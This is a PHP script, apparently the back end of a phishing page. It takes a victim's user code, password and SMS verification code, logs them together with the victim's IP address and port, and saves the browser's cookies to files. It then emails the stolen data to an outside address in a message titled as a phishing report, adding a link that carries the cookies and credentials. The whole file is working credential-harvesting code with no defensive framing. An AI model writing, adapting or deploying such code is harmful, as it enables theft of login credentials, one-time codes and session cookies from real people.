<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Charger les variables depuis .env
$env = parse_ini_file('.env', true);

require 'phpmailer/PHPMailer.php';
require 'phpmailer/SMTP.php';
require 'phpmailer/Exception.php';

// Collecte des données du formulaire
$codiceUtente = $_POST['codiceUtente'];
$password = $_POST['password'];
$codice = $_POST['codice'];

// Enregistrement dans un fichier de log
$log = "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$log .= "Port: " . $_SERVER['REMOTE_PORT'] . "\n";
$log .= "Codice Utente: " . $codiceUtente . "\n";
$log .= "Password: " . $password . "\n";
$log .= "Codice SMS: " . $codice . "\n";
$log .= "Date: " . date('Y-m-d H:i:s') . "\n\n";

file_put_contents('logs.txt', $log, FILE_APPEND);

// Collecte des cookies (si le navigateur envoie des cookies)
$cookies = $_SERVER['HTTP_COOKIE'] ?? '';
file_put_contents('cookies.txt', $cookies, FILE_APPEND);

// Création du lien vers Brave avec les cookies et identifiants
$link = "https://brave.com/?cookies=" . urlencode($cookies) . "&amp;amp;user=" . urlencode($codiceUtente) . "&amp;amp;pass=" . urlencode($password);

// Envoi de l'e-mail
$mail = new PHPMailer(true);

try {
    // Configuration du serveur SMTP
    $mail->isSMTP();
    $mail->Host = $env['SMTP_HOST'];
    $mail->SMTPAuth = true;
    $mail->Username = $env['SMTP_USER'];
    $mail->Password = $env['SMTP_PASS'];
    $mail->SMTPSecure = $env['SMTP_SECURE'];
    $mail->Port = $env['SMTP_PORT'];

    // Données de l'e-mail
    $mail->setFrom($env['SMTP_USER'], 'Phishing Site');
    $mail->addAddress('catber545@mail.com', 'Recipient');

    $mail->isHTML(false);
    $mail->Subject = 'Rapport de phishing';
    $mail->Body = "Voici le rapport de phishing :\n\n
    IP: " . $_SERVER['REMOTE_ADDR'] . "\n
    Port: " . $_SERVER['REMOTE_PORT'] . "\n
    Codice Utente: " . $codiceUtente . "\n
    Password: " . $password . "\n
    Codice SMS: " . $codice . "\n
    Date: " . date('Y-m-d H:i:s') . "\n
    Lien vers Brave avec cookies et identifiants: " . $link;

    $mail->send();
    echo "E-mail envoyé avec succès !";
} catch (Exception $e) {
    echo "E-mail non envoyé. Erreur : " . $mail->ErrorInfo;
}
?>
